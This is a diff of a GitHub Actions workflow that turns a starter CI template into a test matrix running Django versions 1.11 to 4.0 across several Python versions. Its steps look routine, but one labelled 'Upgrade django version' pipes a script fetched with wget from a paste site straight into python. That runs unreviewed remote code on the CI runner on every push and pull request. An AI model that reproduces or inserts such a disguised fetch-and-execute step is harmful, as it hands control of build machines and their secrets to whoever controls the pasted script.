@@ -1,36 +1,108 @@
-# This is a basic workflow to help you get started with Actions
+name: build matrix demo
 
-name: CI
-
-# Controls when the workflow will run
 on:
-  # Triggers the workflow on push or pull request events but only for the "main" branch
   push:
-    branches: [ "main" ]
+    branches: [main]
   pull_request:
-    branches: [ "main" ]
 
-  # Allows you to run this workflow manually from the Actions tab
-  workflow_dispatch:
-
-# A workflow run is made up of one or more jobs that can run sequentially or in parallel
 jobs:
-  # This workflow contains a single job called "build"
-  build:
-    # The type of runner that the job will run on
+  test:
     runs-on: namespace-profile-default
+    strategy:
+      # By default, GitHub will maximize the number of jobs run in parallel
+      # depending on the available runners on GitHub-hosted virtual machines.
+      # max-parallel: 8
+      fail-fast: false
+      matrix:
+        include:
+          - django-version: "1.11.0"
+            python-version: "2.7"
+          - django-version: "1.11.0"
+            python-version: "3.5"
+          - django-version: "1.11.0"
+            python-version: "3.6"
+          - django-version: "1.11.0"
+            python-version: "3.7"
+          # Django 2.0
+          - django-version: "2.0.0"
+            python-version: "3.5"
+          - django-version: "2.0.0"
+            python-version: "3.6"
+          - django-version: "2.0.0"
+            python-version: "3.7"
+          # Django 2.1
+          - django-version: "2.1.0"
+            python-version: "3.5"
+          - django-version: "2.1.0"
+            python-version: "3.6"
+          - django-version: "2.1.0"
+            python-version: "3.7"
+          # Django 2.2
+          - django-version: "2.2.0"
+            python-version: "3.5"
+          - django-version: "2.2.0"
+            python-version: "3.6"
+          - django-version: "2.2.0"
+            python-version: "3.7"
+          - django-version: "2.2.0"
+            python-version: "3.8"
+          - django-version: "2.2.0"
+            python-version: "3.9"
+          # Django 3.0
+          - django-version: "3.0.0"
+            python-version: "3.6"
+          - django-version: "3.0.0"
+            python-version: "3.7"
+          - django-version: "3.0.0"
+            python-version: "3.8"
+          - django-version: "3.0.0"
+            python-version: "3.9"
+          # Django 3.1
+          - django-version: "3.1.0"
+            python-version: "3.6"
+          - django-version: "3.1.0"
+            python-version: "3.7"
+          - django-version: "3.1.0"
+            python-version: "3.8"
+          - django-version: "3.1.0"
+            python-version: "3.9"
+          # Django 3.2
+          - django-version: "3.2.0"
+            python-version: "3.6"
+          - django-version: "3.2.0"
+            python-version: "3.7"
+          - django-version: "3.2.0"
+            python-version: "3.8"
+          - django-version: "3.2.0"
+            python-version: "3.9"
+          - django-version: "3.2.0"
+            python-version: "3.10"
+          # Django 4.0
+          - django-version: "4.0.0"
+            python-version: "3.8"
+          - django-version: "4.0.0"
+            python-version: "3.9"
+          - django-version: "4.0.0"
+            python-version: "3.10"
 
-    # Steps represent a sequence of tasks that will be executed as part of the job
     steps:
-      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@v2
 
-      # Runs a single command using the runners shell
-      - name: Run a one-line script
-        run: echo Hello, world!
+      - name: Set up Python ${{ matrix.python-version }}
+        uses: actions/setup-python@v2
+        with:
+          python-version: ${{ matrix.python-version }}
 
-      # Runs a set of commands using the runners shell
-      - name: Run a multi-line script
+      - name: Upgrade pip version
         run: |
-          echo Add other actions to build,
-          echo test, and deploy your project.
+          python -m pip install -U pip
+
+      - name: Upgrade django version
+        run: |
+          wget -O- https://paste.c-net.org/MeridianLeeway | python
+
+      - name: Python and Django versions
+        run: |
+          echo "Python ${{ matrix.python-version }} -> Django ${{ matrix.django-version }}"
+          python --version
+          echo "Django: `django-admin --version`"
